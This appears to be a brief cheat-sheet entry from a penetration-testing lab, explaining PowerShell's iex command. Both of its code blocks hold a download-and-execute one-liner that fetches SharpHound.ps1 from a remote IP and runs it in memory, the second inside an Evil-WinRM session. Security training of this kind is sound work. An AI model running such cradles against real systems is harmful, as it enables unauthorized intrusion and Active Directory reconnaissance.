Not case sensitive

Used to run a string as a PowerShell command. It takes a string as an argument and executes it as if it were a PowerShell command. This can be useful in scenarios where you need to dynamically generate and execute PowerShell code.

```sh
iex(new-object net.webclient).downloadstring('http://10.10.16.52/SharpHound.ps1')
```

```sh
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> iex(new-object net.webclient).downloadstring('http://10.10.16.52/SharpHound.ps1')
```